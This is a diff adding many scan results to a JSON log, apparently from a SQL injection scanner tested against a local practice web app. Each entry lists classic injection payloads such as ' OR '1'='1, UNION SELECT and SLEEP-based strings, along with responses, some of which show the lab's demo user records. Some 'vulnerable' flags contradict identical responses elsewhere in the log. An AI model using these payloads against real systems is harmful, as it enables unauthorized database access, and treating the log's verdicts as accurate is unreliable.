@@ -154,5 +154,1121 @@
             }
         ],
         "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "headers": {},
+        "results": [
+            {
+                "payload": "' OR '1'='1",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+                "vulnerable": true
+            },
+            {
+                "payload": "' OR 1=1 --",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+                "vulnerable": true
+            },
+            {
+                "payload": "' UNION SELECT NULL --",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+                "vulnerable": true
+            },
+            {
+                "payload": "' AND SLEEP(5)--",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+                "vulnerable": true
+            },
+            {
+                "payload": "1' OR 1=1#",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+                "vulnerable": true
+            },
+            {
+                "payload": "1' AND 1=2#",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+                "vulnerable": true
+            }
+        ],
+        "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli/",
+        "port": 80,
+        "timeout": 5,
+        "headers": {},
+        "results": [
+            {
+                "payload": "' OR '1'='1",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": true
+            },
+            {
+                "payload": "' OR 1=1 --",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": true
+            },
+            {
+                "payload": "' UNION SELECT NULL --",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": true
+            },
+            {
+                "payload": "' AND SLEEP(5)--",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": true
+            },
+            {
+                "payload": "1' OR 1=1#",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": true
+            },
+            {
+                "payload": "1' AND 1=2#",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": true
+            }
+        ],
+        "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli/",
+        "port": 80,
+        "timeout": 5,
+        "headers": {},
+        "results": [
+            {
+                "payload": "' OR '1'='1",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": true
+            },
+            {
+                "payload": "' OR 1=1 --",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": true
+            },
+            {
+                "payload": "' UNION SELECT NULL --",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": true
+            },
+            {
+                "payload": "' AND SLEEP(5)--",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": true
+            },
+            {
+                "payload": "1' OR 1=1#",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": true
+            },
+            {
+                "payload": "1' AND 1=2#",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": true
+            }
+        ],
+        "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "headers": {},
+        "results": [
+            {
+                "payload": "' OR '1'='1",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": true
+            },
+            {
+                "payload": "' OR 1=1 --",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": true
+            },
+            {
+                "payload": "' UNION SELECT NULL --",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": true
+            },
+            {
+                "payload": "' AND SLEEP(5)--",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": true
+            },
+            {
+                "payload": "1' OR 1=1#",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": true
+            },
+            {
+                "payload": "1' AND 1=2#",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": true
+            }
+        ],
+        "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli/",
+        "port": 80,
+        "timeout": 5,
+        "results": [
+            {
+                "payload": "' OR '1'='1",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' OR 1=1 --",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' UNION SELECT NULL --",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' AND SLEEP(5)--",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "1' OR 1=1#",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "1' AND 1=2#",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            }
+        ],
+        "vulnerable": false
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "results": [
+            {
+                "payload": "' OR '1'='1",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' OR 1=1 --",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' UNION SELECT NULL --",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' AND SLEEP(5)--",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "1' OR 1=1#",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "1' AND 1=2#",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            }
+        ],
+        "vulnerable": false
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "results": [
+            {
+                "payload": "' OR '1'='1",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' OR 1=1 --",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' UNION SELECT NULL --",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' AND SLEEP(5)--",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "1' OR 1=1#",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "1' AND 1=2#",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            }
+        ],
+        "vulnerable": false
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "headers": {},
+        "results": [
+            {
+                "payload": "' OR '1'='1",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": true
+            },
+            {
+                "payload": "' OR 1=1 --",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": true
+            },
+            {
+                "payload": "' UNION SELECT NULL --",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": true
+            },
+            {
+                "payload": "' AND SLEEP(5)--",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": true
+            },
+            {
+                "payload": "1' OR 1=1#",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": true
+            },
+            {
+                "payload": "1' AND 1=2#",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": true
+            }
+        ],
+        "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "headers": {},
+        "results": [
+            {
+                "payload": "' OR '1'='1",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+                "vulnerable": true
+            },
+            {
+                "payload": "' OR 1=1 --",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+                "vulnerable": true
+            },
+            {
+                "payload": "' UNION SELECT NULL --",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+                "vulnerable": true
+            },
+            {
+                "payload": "' AND SLEEP(5)--",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+                "vulnerable": true
+            },
+            {
+                "payload": "1' OR 1=1#",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+                "vulnerable": true
+            },
+            {
+                "payload": "1' AND 1=2#",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999",
+                "vulnerable": true
+            }
+        ],
+        "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "results": [
+            {
+                "payload": "' OR '1'='1",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' OR 1=1 --",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' UNION SELECT NULL --",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' AND SLEEP(5)--",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "1' OR 1=1#",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "1' AND 1=2#",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            }
+        ],
+        "vulnerable": false
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "results": [
+            {
+                "payload": "' OR '1'='1",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' OR 1=1 --",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' UNION SELECT NULL --",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' AND SLEEP(5)--",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "1' OR 1=1#",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "1' AND 1=2#",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            }
+        ],
+        "vulnerable": false
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "results": [
+            {
+                "payload": "' OR '1'='1",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' OR 1=1 --",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' UNION SELECT NULL --",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' AND SLEEP(5)--",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "1' OR 1=1#",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "1' AND 1=2#",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            }
+        ],
+        "vulnerable": false
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "results": [
+            {
+                "payload": "' OR '1'='1",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' OR 1=1 --",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' UNION SELECT NULL --",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' AND SLEEP(5)--",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "1' OR 1=1#",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "1' AND 1=2#",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            }
+        ],
+        "vulnerable": false
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "results": [
+            {
+                "payload": "' OR '1'='1",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' OR 1=1 --",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' UNION SELECT NULL --",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' AND SLEEP(5)--",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "1' OR 1=1#",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "1' AND 1=2#",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            }
+        ],
+        "vulnerable": false
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "results": [
+            {
+                "payload": "' OR '1'='1",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' OR 1=1 --",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' UNION SELECT NULL --",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' AND SLEEP(5)--",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "1' OR 1=1#",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "1' AND 1=2#",
+                "status_code": 200,
+                "content_length": 1523,
+                "snippet": "No useful data",
+                "vulnerable": false
+            }
+        ],
+        "vulnerable": false
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "headers": {},
+        "results": [
+            {
+                "payload": "' OR '1'='1",
+                "status_code": 200,
+                "snippet": "User ID:\nID: ' OR '1'='1First name: adminSurname: adminID: ' OR '1'='1First name: GordonSurname: BrownID: ' OR '1'='1First name: HackSurname: MeID: ' OR '1'='1First name: PabloSurname: PicassoID: ' OR '1'='1First name: BobSurname: Smith",
+                "vulnerable": true
+            },
+            {
+                "payload": "' OR 1=1 --",
+                "status_code": 200,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' UNION SELECT NULL --",
+                "status_code": 200,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' AND SLEEP(5)--",
+                "status_code": 200,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "1' OR 1=1#",
+                "status_code": 200,
+                "snippet": "User ID:",
+                "vulnerable": true
+            },
+            {
+                "payload": "1' AND 1=2#",
+                "status_code": 200,
+                "snippet": "User ID:",
+                "vulnerable": true
+            }
+        ],
+        "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "headers": {},
+        "results": [
+            {
+                "payload": "' OR '1'='1",
+                "status_code": 200,
+                "snippet": "User ID:\nID: ' OR '1'='1First name: adminSurname: adminID: ' OR '1'='1First name: GordonSurname: BrownID: ' OR '1'='1First name: HackSurname: MeID: ' OR '1'='1First name: PabloSurname: PicassoID: ' OR '1'='1First name: BobSurname: Smith",
+                "vulnerable": true
+            },
+            {
+                "payload": "' OR 1=1 --",
+                "status_code": 200,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' UNION SELECT NULL --",
+                "status_code": 200,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' AND SLEEP(5)--",
+                "status_code": 200,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "1' OR 1=1#",
+                "status_code": 200,
+                "snippet": "User ID:",
+                "vulnerable": true
+            },
+            {
+                "payload": "1' AND 1=2#",
+                "status_code": 200,
+                "snippet": "User ID:",
+                "vulnerable": true
+            }
+        ],
+        "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "headers": {},
+        "results": [
+            {
+                "payload": "' OR '1'='1",
+                "status_code": 200,
+                "snippet": "ID: ' OR '1'='1First name: adminSurname: admin\nID: ' OR '1'='1First name: GordonSurname: Brown\nID: ' OR '1'='1First name: HackSurname: Me\nID: ' OR '1'='1First name: PabloSurname: Picasso\nID: ' OR '1'='1First name: BobSurname: Smith  More Information  http://www.securiteam.com/securityreviews/5DP0N1P",
+                "vulnerable": true
+            },
+            {
+                "payload": "' OR 1=1 --",
+                "status_code": 200,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' UNION SELECT NULL --",
+                "status_code": 200,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' AND SLEEP(5)--",
+                "status_code": 200,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "1' OR 1=1#",
+                "status_code": 200,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "1' AND 1=2#",
+                "status_code": 200,
+                "snippet": "No useful data",
+                "vulnerable": false
+            }
+        ],
+        "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "headers": {},
+        "results": [
+            {
+                "payload": "' OR '1'='1",
+                "status_code": 200,
+                "snippet": "User ID:\nID: ' OR '1'='1First name: adminSurname: adminID: ' OR '1'='1First name: GordonSurname: BrownID: ' OR '1'='1First name: HackSurname: MeID: ' OR '1'='1First name: PabloSurname: PicassoID: ' OR '1'='1First name: BobSurname: Smith",
+                "vulnerable": true
+            },
+            {
+                "payload": "' OR 1=1 --",
+                "status_code": 200,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' UNION SELECT NULL --",
+                "status_code": 200,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' AND SLEEP(5)--",
+                "status_code": 200,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "1' OR 1=1#",
+                "status_code": 200,
+                "snippet": "User ID:\nID: 1' OR 1=1#First name: adminSurname: adminID: 1' OR 1=1#First name: GordonSurname: BrownID: 1' OR 1=1#First name: HackSurname: MeID: 1' OR 1=1#First name: PabloSurname: PicassoID: 1' OR 1=1#First name: BobSurname: Smith",
+                "vulnerable": true
+            },
+            {
+                "payload": "1' AND 1=2#",
+                "status_code": 200,
+                "snippet": "User ID:",
+                "vulnerable": true
+            }
+        ],
+        "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli_blind",
+        "port": 80,
+        "timeout": 5,
+        "headers": {},
+        "results": [
+            {
+                "payload": "' OR '1'='1",
+                "status_code": 200,
+                "snippet": "User ID:",
+                "vulnerable": true
+            },
+            {
+                "payload": "' OR 1=1 --",
+                "status_code": 404,
+                "snippet": "User ID:",
+                "vulnerable": true
+            },
+            {
+                "payload": "' UNION SELECT NULL --",
+                "status_code": 404,
+                "snippet": "User ID:",
+                "vulnerable": true
+            },
+            {
+                "payload": "' AND SLEEP(5)--",
+                "status_code": 404,
+                "snippet": "User ID:",
+                "vulnerable": true
+            },
+            {
+                "payload": "1' OR 1=1#",
+                "status_code": 200,
+                "snippet": "User ID:",
+                "vulnerable": true
+            },
+            {
+                "payload": "1' AND 1=2#",
+                "status_code": 404,
+                "snippet": "User ID:",
+                "vulnerable": true
+            }
+        ],
+        "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli_blind",
+        "port": 80,
+        "timeout": 5,
+        "headers": {},
+        "results": [
+            {
+                "payload": "' OR '1'='1",
+                "status_code": 200,
+                "snippet": "User ID exists in the database.",
+                "vulnerable": true
+            },
+            {
+                "payload": "' OR 1=1 --",
+                "status_code": 404,
+                "snippet": "User ID is MISSING from the database.",
+                "vulnerable": true
+            },
+            {
+                "payload": "' UNION SELECT NULL --",
+                "status_code": 404,
+                "snippet": "User ID is MISSING from the database.",
+                "vulnerable": true
+            },
+            {
+                "payload": "' AND SLEEP(5)--",
+                "status_code": 404,
+                "snippet": "User ID is MISSING from the database.",
+                "vulnerable": true
+            },
+            {
+                "payload": "1' OR 1=1#",
+                "status_code": 200,
+                "snippet": "User ID exists in the database.",
+                "vulnerable": true
+            },
+            {
+                "payload": "1' AND 1=2#",
+                "status_code": 404,
+                "snippet": "User ID is MISSING from the database.",
+                "vulnerable": true
+            }
+        ],
+        "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli_blind",
+        "port": 80,
+        "timeout": 5,
+        "headers": {},
+        "results": [
+            {
+                "payload": "' OR '1'='1",
+                "status_code": 200,
+                "snippet": "User ID exists in the database.",
+                "vulnerable": true
+            },
+            {
+                "payload": "' OR 1=1 --",
+                "status_code": 404,
+                "snippet": "User ID is MISSING from the database.",
+                "vulnerable": true
+            },
+            {
+                "payload": "' UNION SELECT NULL --",
+                "status_code": 404,
+                "snippet": "User ID is MISSING from the database.",
+                "vulnerable": true
+            },
+            {
+                "payload": "' AND SLEEP(5)--",
+                "status_code": 404,
+                "snippet": "User ID is MISSING from the database.",
+                "vulnerable": true
+            },
+            {
+                "payload": "1' OR 1=1#",
+                "status_code": 200,
+                "snippet": "User ID exists in the database.",
+                "vulnerable": true
+            },
+            {
+                "payload": "1' AND 1=2#",
+                "status_code": 404,
+                "snippet": "User ID is MISSING from the database.",
+                "vulnerable": true
+            }
+        ],
+        "vulnerable": true
+    },
+    {
+        "target": "http://localhost:8080/vulnerabilities/sqli",
+        "port": 80,
+        "timeout": 5,
+        "headers": {},
+        "results": [
+            {
+                "payload": "' OR '1'='1",
+                "status_code": 200,
+                "snippet": "User ID:\nID: ' OR '1'='1First name: adminSurname: adminID: ' OR '1'='1First name: GordonSurname: BrownID: ' OR '1'='1First name: HackSurname: MeID: ' OR '1'='1First name: PabloSurname: PicassoID: ' OR '1'='1First name: BobSurname: Smith",
+                "vulnerable": true
+            },
+            {
+                "payload": "' OR 1=1 --",
+                "status_code": 200,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' UNION SELECT NULL --",
+                "status_code": 200,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "' AND SLEEP(5)--",
+                "status_code": 200,
+                "snippet": "No useful data",
+                "vulnerable": false
+            },
+            {
+                "payload": "1' OR 1=1#",
+                "status_code": 200,
+                "snippet": "User ID:\nID: 1' OR 1=1#First name: adminSurname: adminID: 1' OR 1=1#First name: GordonSurname: BrownID: 1' OR 1=1#First name: HackSurname: MeID: 1' OR 1=1#First name: PabloSurname: PicassoID: 1' OR 1=1#First name: BobSurname: Smith",
+                "vulnerable": true
+            },
+            {
+                "payload": "1' AND 1=2#",
+                "status_code": 200,
+                "snippet": "User ID:",
+                "vulnerable": true
+            }
+        ],
+        "vulnerable": true
     }
 ]
